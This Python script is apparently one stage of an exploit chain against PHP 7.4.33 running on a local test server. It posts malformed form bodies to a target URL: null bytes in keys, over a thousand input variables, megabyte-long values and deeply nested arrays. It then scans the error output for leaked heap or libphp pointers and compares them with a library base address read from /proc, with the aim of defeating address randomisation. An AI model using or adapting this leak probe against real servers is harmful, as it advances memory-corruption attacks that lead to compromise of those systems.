"""Try error-based address leak on 7.4.33 (display_errors=1).
Trigger various errors that might leak memory addresses in the response:
1. Object with __destruct + __toString
2. Array access on non-array
3. Call to undefined function
4. Type error
5. Session-related errors
Check if any error message leaks a heap/libphp pointer (0x7f... or 0x55...)."""
import sys, os, time, struct, re
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
import urllib.request

URL = "http://127.0.0.1:18108/"

# Patterns to detect leaked pointers
PTR_RE = re.compile(rb'0x[0-9a-f]{8,16}|0x[0-9a-f]{12,}')
HEAP_RE = re.compile(rb'(0x7f|0x55|0x73|0x75|0x70)[0-9a-f]{10,}')

def trigger_error(desc, data):
    try:
        req = urllib.request.Request(URL, data=data, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        resp = urllib.request.urlopen(req, timeout=30)
        body = resp.read()
    except Exception as e:
        body = str(e).encode()
    # Look for pointers
    ptrs = PTR_RE.findall(body)
    heap = HEAP_RE.findall(body)
    # Filter out common non-pointer patterns (e.g., 0x1234 in line numbers)
    real_ptrs = [p for p in ptrs if len(p) >= 12]
    print(f"{desc}: {len(real_ptrs)} ptr candidates, {len(heap)} heap-like", flush=True)
    for p in real_ptrs[:5]:
        print(f"  {p.decode()}", flush=True)
    for h in heap[:5]:
        print(f"  heap: {h.decode()}", flush=True)
    return body

print("=== 7.4.33 error-based leak attempts ===", flush=True)

# 1. Basic type error
trigger_error("type error", b"foo[]=1&foo[]=2&foo[0]=bar")

# 2. Call to undefined function (via include? no, just a regular POST)
trigger_error("array on string", b"x[0][1][2]=deep&y[]=a&y[]=b")

# 3. Large array (might trigger max_input_vars)
trigger_error("max_input_vars", b"&".join([f"f{i}=v".encode() for i in range(1100)]))

# 4. Unicode / encoding error
trigger_error("encoding", "x=café&y=日本語".encode("utf-8"))

# 5. Null byte in key
trigger_error("null byte", b"x\x00y=1&z=2")

# 6. Very long key
trigger_error("long key", b"k" * 5000 + b"=v")

# 7. Very long value (but < 1.9MB limit)
trigger_error("long value", b"v=" + b"x" * 1000000)

# 8. Nested array deep
trigger_error("deep array", b"a[0][1][2][3][4][5][6][7][8][9]=deep")

print("\n=== Checking /proc for libphp base (already known) ===", flush=True)
print("7.4.33 libphp base = 0x75dcc115d000 (from /proc/17/maps)")
print("If any error leaks a pointer in range 0x75dcc115d000-0x75dcc2000000, that's a libphp leak!")
